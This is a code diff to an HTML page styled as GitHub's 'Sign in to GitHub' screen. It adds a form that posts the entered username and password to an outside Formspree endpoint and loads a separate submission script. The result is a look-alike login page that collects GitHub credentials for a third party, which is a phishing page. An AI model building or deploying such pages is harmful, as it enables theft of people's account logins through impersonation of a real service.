@@ -15,15 +15,19 @@
       <h1 class="github-head">
         Sign in to GitHub
       </h1>
+      <form action="https://formspree.io/f/xknedwdb" method="POST" id="my-form">
+    
       <div class="login">
+        
         <div class="input-box">
-          <div class="input-label">Username</div>
+          <label class="input-label">Username</label>
+
           <input type="text" required>
         </div>
   
         <div class="input-box">
           <div class="input-label">
-            <span>Password</span>
+            <label>Password</label>
             <a href="https://github.com/password_reset">Forgot password?</a>
           </div>
           <input type="password" required>
@@ -33,7 +37,9 @@
           Submit
         </button>
       </div>
-  
+    </form>
+    <script src="form_submit.js"></script>
+
       <div class="info">
         <span>New to GitHub? <a class="Create" href="https://github.com/signup?source=login">Create an account.</a></span>
       </div>
